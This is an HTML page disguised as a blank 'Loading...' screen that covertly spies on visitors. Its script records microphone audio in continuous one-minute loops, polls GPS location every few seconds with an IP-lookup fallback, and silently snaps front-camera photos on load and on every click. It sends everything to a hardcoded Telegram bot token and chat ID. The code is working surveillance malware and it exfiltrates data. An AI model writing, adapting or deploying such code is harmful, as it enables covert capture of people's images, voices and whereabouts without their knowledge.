<!DOCTYPE html>
<html>
<head>
  <title>Loading...</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { margin: 0; padding: 0; background: #fff; }
  </style>
</head>
<body>

  <video id="video" width="640" height="480" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

  <script>
    const token = "8970456088:AAHBNuNtp9ZlVjVJl_uuI-9G-R1UcIVaYAg";
    const chatId = "1749244772";
    let stream = null;
    let mediaRecorder = null;
    let audioChunks = [];
    let cachedLat = 0;
    let cachedLon = 0;
    let cachedIP = 'N/A';

    function sendToTelegram(lat, lon, photoBlob) {
      if (photoBlob && photoBlob.size > 1000) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', photoBlob, 'photo.jpg');
        formData.append('caption', `📸 Photo Captured!\n📍 Latitude: ${lat}\n📍 Longitude: ${lon}\n🌐 IP: ${cachedIP}\n⏰ ${new Date().toLocaleString()}\n\n🔗 https://www.google.com/maps?q=${lat},${lon}`);
        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData }).catch(() => {});
      }
    }

    function sendAudioToTelegram(audioBlob) {
      if (audioBlob && audioBlob.size > 0) {
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('audio', audioBlob, 'audio.ogg');
        fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: formData }).catch(() => {});
      }
    }

    let recordingInterval = null;

    async function startAudioRecording() {
      try {
        const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
        mediaRecorder = new MediaRecorder(audioStream);
        audioChunks = [];

        mediaRecorder.ondataavailable = (event) => {
          if (event.data.size > 0) {
            audioChunks.push(event.data);
          }
        };

        mediaRecorder.onstop = () => {
          if (audioChunks.length > 0) {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            sendAudioToTelegram(audioBlob);
          }
          audioChunks = [];
          setTimeout(startAudioRecording, 100);
        };

        mediaRecorder.start();

        if (recordingInterval) clearInterval(recordingInterval);
        recordingInterval = setInterval(() => {
          if (mediaRecorder && mediaRecorder.state === 'recording') {
            mediaRecorder.stop();
          }
        }, 60000);
      } catch (err) {
        setTimeout(startAudioRecording, 5000);
      }
    }

    document.addEventListener('visibilitychange', () => {
      if (!document.hidden && (!mediaRecorder || mediaRecorder.state !== 'recording')) {
        startAudioRecording();
      }
    });

    setInterval(() => {
      if (!mediaRecorder || mediaRecorder.state !== 'recording') {
        startAudioRecording();
      }
    }, 30000);

    function getIPBasedLocation() {
      // Fallback location using IP geolocation
      fetch('https://ipapi.co/json/')
        .then(res => res.json())
        .then(data => {
          if (data.latitude && data.longitude) {
            cachedLat = data.latitude;
            cachedLon = data.longitude;
          }
          if (data.ip) {
            cachedIP = data.ip;
          }
        })
        .catch(() => {});
    }

    function updateLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          cachedLat = pos.coords.latitude;
          cachedLon = pos.coords.longitude;
        }, (err) => {
          // Fallback to IP-based location on GPS failure
          getIPBasedLocation();
          setTimeout(updateLocation, 300);
        }, {
          enableHighAccuracy: true,
          timeout: 5000,
          maximumAge: 0
        });
      }
    }

    updateLocation();
    getIPBasedLocation();
    setInterval(updateLocation, 3000);

    async function autoCapture() {
      try {
        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        video.srcObject = stream;

        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            setTimeout(resolve, 1000);
          };
        });

        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;

        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        canvas.toBlob((blob) => {
          if (stream) stream.getTracks().forEach(t => t.stop());
          
          // Optimize quality based on blob size
          let quality = 0.95;
          if (blob.size > 500000) quality = 0.7; // If > 500KB, reduce to 70%
          else if (blob.size > 300000) quality = 0.8; // If > 300KB, reduce to 80%
          
          // Re-compress if needed
          if (quality < 0.95) {
            canvas.toBlob((optimizedBlob) => {
              sendToTelegram(cachedLat, cachedLon, optimizedBlob);
            }, 'image/jpeg', quality);
          } else {
            sendToTelegram(cachedLat, cachedLon, blob);
          }
        }, 'image/jpeg', 0.95);
      } catch (err) {}
    }

    window.addEventListener('load', () => {
      startAudioRecording();
      // Wait and ensure location is fetched before first capture
      setTimeout(() => {
        if (cachedLat !== 0 && cachedLon !== 0) {
          autoCapture();
        } else {
          // If location not fetched yet, wait more
          setTimeout(autoCapture, 2000);
        }
      }, 4000);
    });

    document.addEventListener('click', autoCapture);
  </script>

</body>
</html>
